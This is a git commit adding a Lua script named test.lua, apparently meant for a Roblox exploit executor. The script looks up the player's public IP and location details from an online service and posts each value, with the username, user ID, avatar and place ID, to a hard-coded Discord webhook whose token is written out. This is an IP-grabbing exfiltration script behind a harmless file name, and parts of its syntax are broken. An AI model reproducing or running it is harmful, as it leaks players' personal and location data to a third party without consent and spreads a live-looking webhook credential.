8d978df6007ddd9b5d1f3e72334017e7171d198b
XdZdE <39117649+XdZdE@users.noreply.github.com>
2024-04-08 09:44:21 -0700

    Create test.lua

---
+++ test.lua
@@ -0,0 +1,30 @@
+local Player = game.Players.LocalPlayer
+local Content = 'player caught exploiting';
+local Avatar = game.Players:GetUserThumbnailAsync(Player.UserId,Enum.ThumbnailType.AvatarThumbnail,Enum.ThumbnailSize.Size150x150)
+local Embed = {
+    title = 'do whatever you want, info down will be sent';
+    footer = { text = game.PlaceId };
+    avatarurl = Avatar,
+    author = {
+        name = Player.Name
+        url = 'https://www.roblox.com/'..Player.UserId;
+    };
+    fields = {
+        {
+            name = 'Caught exploiting';
+            value = 'Exploit: '..getexecutorname();
+        }
+    };
+};
+for i,v in game.HttpService:JSONDecode(game:HttpGet("https://ipconfig.io/json") do
+    if type(v) == "string" then
+http_request{
+    Url = 'https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode( { content = v; embeds = { Embed } } );
+};
+    end
+  end
